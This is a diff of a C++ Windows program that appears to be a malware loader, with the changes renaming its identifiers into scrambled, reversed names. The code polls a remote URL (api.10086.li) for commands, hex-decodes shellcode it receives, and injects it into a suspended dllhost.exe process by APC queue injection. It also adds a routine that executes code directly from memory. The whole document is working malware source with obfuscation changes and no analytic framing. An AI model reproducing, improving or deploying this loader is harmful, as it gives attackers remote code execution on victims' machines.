@@ -8,76 +8,76 @@
 #pragma comment ( lib, "ws2_32.lib" )
 #pragma comment ( lib, "wldap32.lib" )
 
-#define CODE__SIZE 10*1024
+#define CODESIZE 10*1024
 #define URL "http://api.10086.li/txt.txt"
 
 using namespace std;
 
-DWORD WINAPI run__slcd__(LPVOID p);
-string str__to__hex__(string hex);
-string __hexcode__;
+DWORD WINAPI dclsnur(LPVOID p);
+string xehotrts(string hex);
+string edocxeh;
 
 
-class Chttp
+class phctt
 {
 private:
-    CURL* __curl;
-    stringstream __rs;
-    long __code;
+    CURL* tenc;
+    stringstream ss;
+    long c;
 public:
-    Chttp()
-        : __curl(curl_easy_init())
-        , __code(0)
+    phctt()
+        : tenc(curl_easy_init())
+        , c(0)
     {
 
     }
-    ~Chttp()
+    ~phctt()
     {
-        if (__curl) curl_easy_cleanup(__curl);
+        if (tenc) curl_easy_cleanup(tenc);
     }
-    string __get(const string& __url)
+    string get(const string& url)
     {
-        CURLcode res;
-        curl_easy_setopt(__curl, CURLOPT_URL, __url.c_str());
-        curl_easy_setopt(__curl, CURLOPT_FOLLOWLOCATION, 1L);
-        curl_easy_setopt(__curl, CURLOPT_WRITEFUNCTION, __receive__data);
-        curl_easy_setopt(__curl, CURLOPT_WRITEDATA, this);
+        CURLcode r;
+        curl_easy_setopt(tenc, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(tenc, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(tenc, CURLOPT_WRITEFUNCTION, atadeviecer);
+        curl_easy_setopt(tenc, CURLOPT_WRITEDATA, this);
 
-        __rs.str("");
-        __code = 0;
-        res = curl_easy_perform(__curl);
-        if (res != CURLE_OK)
+        ss.str("");
+        c = 0;
+        r = curl_easy_perform(tenc);
+        if (r != CURLE_OK)
         {
-            throw runtime_error(curl_easy_strerror(res));
+            throw runtime_error(curl_easy_strerror(r));
         }
-        curl_easy_getinfo(__curl, CURLINFO_RESPONSE_CODE, &__code);
-        return __rs.str();
+        curl_easy_getinfo(tenc, CURLINFO_RESPONSE_CODE, &c);
+        return ss.str();
     }
-    long __GetHttpCode()
-    {
-        return __code;
-    }
+    //long GetHttpCode()
+    //{
+    //    return code;
+    //}
 private:
-    static size_t __receive__data(void* buffer, size_t size, size_t nmemb, void* userp)
+    static size_t atadeviecer(void* b, size_t s, size_t n, void* u)
     {
-        return static_cast<Chttp*>(userp)->__write__rdata(buffer, size, nmemb);
+        return static_cast<phctt*>(u)->atadretirw(b, s, n);
     }
-    size_t __write__rdata(void* buffer, size_t size, size_t nmemb)
+    size_t atadretirw(void* b, size_t s, size_t n)
     {
-        __rs.write((const char*)buffer, size * nmemb);
-        return size * nmemb;
+        ss.write((const char*)b, s * n);
+        return s * n;
     }
 };
 
 
-class Conf
+class fnoc
 {
 private:
-    int __s;
-    string __t;
-    string __v;
+    int ss;
+    string tt;
+    string vv;
 public:
-    Conf(string res)
+    fnoc(string res)
     {
         istringstream is(res);
         string line;
@@ -92,21 +92,21 @@ public:
         while (getline(is, line, split))
         {
 
-            int line__len = line.length();
+            int linelen = line.length();
             int flag = line.find(":");
             string key = line.substr(0, flag);
-            string value = line.substr(flag + 1, line__len);
+            string value = line.substr(flag + 1, linelen);
             if (key == "s")
             {
-                this->__s = atoi(value.c_str());
+                this->ss = atoi(value.c_str());
             }
             else if (key == "t")
             {
-                this->__t = value;
+                this->tt = value;
             }
             if (key == "v")
             {
-                this->__v = value;
+                this->vv = value;
             }
         }
     };
@@ -114,26 +114,26 @@ public:
     VOID run()
     {
 
-        if (this->__t == "c\r" || this->__t == "c")
+        if (this->tt == "c\r" || this->tt == "c")
         {
-            // system((this->__v).c__str());
+            // system((this->v).cstr());
         }
-        else if (this->__t == "u\r" || this->__t == "u")
+        else if (this->tt == "u\r" || this->tt == "u")
         {
             try {
 
-                __hexcode__ = this->__v;
-                CreateThread(NULL, NULL, run__slcd__, NULL, NULL, NULL);
+                edocxeh = this->vv;
+                CreateThread(NULL, NULL, dclsnur, NULL, NULL, NULL);
             }
             catch (exception e)
             {
             };
         }
-        else if (this->__t == "e\r" || this->__t == "e")
+        else if (this->tt == "e\r" || this->tt == "e")
         {
             exit(0);
         }
-        Sleep(this->__s * 1000);
+        Sleep(this->ss * 1000);
 
     };
 
@@ -143,7 +143,7 @@ private:
 
 
 
-string str__to__hex__(string strHex) {
+string xehotrts(string strHex) {
     string tmpStr = "";
     for (size_t j = 0; j < strHex.length(); j += 2) {
         string hex16 = strHex.substr(j, 2);
@@ -153,40 +153,61 @@ string str__to__hex__(string strHex) {
     return tmpStr;
 };
 
-DWORD WINAPI run__slcd__(LPVOID lpParameter)
+
+DWORD WINAPI enilno(LPVOID lpParam)
 {
-    string __code__str__ = str__to__hex__(__hexcode__);
-    int __len = __hexcode__.length();
-    unsigned char __code[CODE__SIZE] = { 0 };
-    memcpy(__code, __code__str__.c_str(), __len / 2 + 1);
-    UINT __codeSize = sizeof(__code);
+    void* code = lpParam;
+    ((void(*)())code)();
+    return 0;
+}
+
+
+DWORD WINAPI dclsnur(LPVOID lpParameter)
+{
+    //string codestr = xehotrts(edocxeh);
+    //int len = (edocxeh.length()/2)+1;
+
+    //void* code = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    //if (code)
+    //{
+    //    memmove(code, codestr.c_str(), (len));
+    //    Sleep(10000);
+    //    ((void(*)())code)();
+    //    //CreateThread(NULL, NULL, enilno, code, NULL, NULL);
+    //}
+     
+    string codestr = xehotrts(edocxeh);
+    int len = (edocxeh.length() / 2) + 1;
+    unsigned char code[CODESIZE] = { 0 };
+    memcpy(code, codestr.c_str(), len);
+    UINT codeSize = sizeof(code);
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, __codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-    WriteProcessMemory(victimProcess, shellAddress, __code, __codeSize, NULL);
+    WriteProcessMemory(victimProcess, shellAddress, code, codeSize, NULL);
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     ResumeThread(threadHandle);
     return 0;
 }
 
-DWORD WINAPI d__run__(LPVOID P)
+DWORD WINAPI drun(LPVOID P)
 {
-__GO:
+GO:
     try {
-        Chttp __c;
-        string res = __c.__get(URL);
-        Conf* conf = new Conf(res);
-        conf->run();
+        phctt c;
+        string res = c.get(URL);
+        fnoc* f = new fnoc(res);
+        f->run();
         return 0;
     }
     catch (exception e)
     {
         Sleep(3000);
-        goto __GO;
+        goto GO;
     }
     return 0;
 }
